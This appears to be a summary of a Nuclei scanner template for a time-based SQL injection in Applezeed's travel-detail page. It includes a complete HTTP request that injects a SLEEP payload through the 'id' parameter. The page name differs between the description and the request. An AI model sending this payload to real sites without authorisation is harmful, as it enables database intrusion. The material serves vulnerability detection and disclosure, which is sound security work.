# Nuclei Template: Applezeed - SQL Injection
**Template ID:** applezeed-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`applezeed-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Applezeed's 'travel-details.php?id=' URL with possible time-based SQL injection (SQLi) vulnerability allows attackers to manipulate the 'id' parameter, potentially causing delays in SQL queries and unauthorized retrieval of travel information from the database

## Steps to reproduce / Exploit Payload
```http
@timeout: 15s
GET /travel-detail.php?id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe HTTP/1.1
Host: {{Hostname}}
```

## References
- https://cxsecurity.com/issue/WLB-2019120057
